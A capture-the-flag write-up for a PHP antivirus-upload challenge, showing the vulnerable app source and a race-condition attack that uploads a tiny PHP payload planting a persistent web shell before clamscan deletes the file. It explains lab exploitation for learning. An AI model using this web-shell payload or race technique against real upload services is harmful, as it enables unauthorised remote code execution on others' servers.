## Skills required: Try out basic ideas

I didn't solve this challenge and only have time to solve this challenge 4 days afterwards, thank God they kept the site on.

## Solution and reflections:

The app is open source:

```php
<?php

if (isset($_FILES["file"])) {
    $size = $_FILES["file"]['size'];

    if ($size > 100) {
        echo "For such large files, buy premium";
    } else {
        $target_dir = "uploads/";
        $target_file = $target_dir . $_FILES["file"]["name"];
        
        move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
        
        function hasVirus($file_path) {
            # Check for Virus
            $argument = escapeshellarg($file_path);
            exec("clamscan $argument", $output, $retval);
        
            if ($retval != 0) {
                return true;
            } 
            return false;
        }
        
        if (hasVirus($target_file)) {
            echo "The file contains a virus!";
        } else {
            echo "The file is safe to use!";
        }
        
        unlink($target_file);
    }
    
}

if (isset($_GET["source"])) {
    highlight_file(__FILE__);
}
?>

<form action="index.php" method="post" enctype="multipart/form-data">
  Select suspicious file to upload:
  <input type="file" name="file">
  <input type="submit" value="Upload" name="submit">
</form>



</div> 

</form>
This app is <a href="/?source=1">open source</a>.
</body>
</html>
```
We can see the `uploads` folder, but upon accessing it gives `403`:

![image](https://user-images.githubusercontent.com/114584910/195605263-0db0a452-dd53-4349-9519-df931c3fc8fc.png)

This gives us the idea that while the folder is not accessible, the **files inside can be accessed** before their deletion. We just need to be *fast*.
I failed to solve this challenge because while I had the idea, I failed to do it *manually* and decided that clamscan is fast enough that I have to halt or slow clamscan somehow.
Sadly there are 2 recent vulnerability (CVE-2022-20770, CVE-2022-20771) with clamav and I spent a lot of time going down those routes and got tired.

My payload creates a foothold in the directory so that I don't need to send another file again. 100 characters is more than enough:

```php
<?php
exec('echo \'<?php exec($_GET["c"], $o); print_r($o); ?>\' > raccoon_exploit.php');
?>DONE
```

There are many ways to do it from bash scripts and python parallel tasks. Solving this post event, I used burp Turbo Intruder as it's performant, easy to configure and free:

![raccoon.php](https://user-images.githubusercontent.com/114584910/195608320-9c49b002-bd16-4cd2-a8dc-bc97ccb7f994.png)

Everything's easy after gaining foothold:

![rce](https://user-images.githubusercontent.com/114584910/195609451-018a56ec-c987-4806-9ce0-3a6d0e5c00af.png)

The flag can then be `cat`ted.
